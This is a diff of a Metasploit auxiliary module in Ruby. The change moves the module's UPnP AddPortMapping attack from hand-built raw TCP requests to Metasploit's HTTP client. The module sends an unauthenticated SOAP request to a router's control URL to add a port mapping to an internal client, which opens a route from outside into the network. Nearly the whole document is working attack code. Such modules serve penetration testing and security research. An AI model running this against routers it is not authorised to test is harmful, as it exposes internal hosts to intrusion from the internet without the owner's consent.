@@ -6,7 +6,7 @@
 
 require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
-  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
@@ -17,18 +17,15 @@ class Metasploit3 < Msf::Auxiliary
     )
     register_options(
       [
-        OptString.new('CTRL_URL', [ true, 'UPnP Control URL']),
-        OptString.new('INTERNAL_CLIENT', [ true, 'New Internal Client']),
-        OptInt.new('INTERNAL_PORT', [ true, 'New Internal Port']),
-        OptInt.new('EXTERNAL_PORT', [ true, 'New External Port'])
+        OptString.new('TARGETURI',[true, 'UPnP control URL', '/' ]),
+        OptString.new('INTERNAL_CLIENT', [true, 'New Internal Client']),
+        OptInt.new('INTERNAL_PORT', [true, 'New Internal Port']),
+        OptInt.new('EXTERNAL_PORT', [true, 'New External Port'])
       ],
       self.class
     )
   end
-
   def run
-    ctrlurl = datastore['CTRL_URL']
-    soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
 
     content = "<?xml version=\"1.0\"?>"
     content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
@@ -45,26 +42,26 @@ class Metasploit3 < Msf::Auxiliary
     content << "</m:AddPortMapping>"
     content << "</SOAP-ENV:Body>"
     content << "</SOAP-ENV:Envelope>"
+    res = send_request_cgi(
+      {
+        'uri'           => normalize_uri(target_uri.path),
+        'method'        => 'POST',
+        'content-type'  =>  'text/xml;charset="utf-8"',
+        'headers'       => {
+          'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
+        },
+        'data'          => content
+      }
+    )
 
-    contentlen = content.length
-
-    header = "POST http://#{rhost}:#{rport}/#{ctrlurl} HTTP/1.0\r\n"
-    header << "Content-Type: text/xml;charset=\"utf-8\"\r\n"
-    header << "SOAPAction: #{soapaction}\n\r"
-    header << "User-Agent: SOAP AddPortMapping Metasploit Module\r\n"
-    header << "Host: #{rhost}:#{rport}\r\n"
-    header << "Content-Length: #{contentlen}\r\n"
-    header << "\r\n"
-    header << content
-
-    print_status("Sending SOAP Request")
-    connect
-    sock.puts(header)
-    resp = sock.recv(1024)
-    if resp.include? "200 OK"
-      print_good("PAT added successfully")
+    if res
+      if res.code == 200
+        print_good("#{peer} successfully mapped")
+      else
+        print_error("#{peer} failed to map #{res}")
+      end
     else
-      print_error("Fail")
+      print_error("#{peer} no response")
     end
   end
 end
